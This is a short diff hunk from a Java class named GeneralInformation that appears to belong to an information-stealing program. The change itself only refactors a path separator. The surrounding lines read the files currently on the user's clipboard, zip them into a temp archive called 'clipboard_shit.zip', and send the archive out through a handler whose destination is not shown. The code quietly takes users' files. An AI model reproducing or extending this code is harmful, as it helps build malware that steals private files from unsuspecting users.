@@ -26,7 +26,7 @@ public final class GeneralInformation implements JSONObject {
                 String file = Arrays.toString(new String[]{String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.javaFileListFlavor))});
                 ArrayList<File> validFileDirs = new ArrayList<>();
                 validFileDirs.add(new File(file.substring(2, file.length() - 2)));
-                String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "clipboard_shit.zip";
+                String zipFile = System.getProperty("java.io.tmpdir") + sep + "clipboard_shit.zip";
                 FileSystemHelper.zip(zipFile, validFileDirs);
                 JSONRegexHandler.send(new File(zipFile));
             }
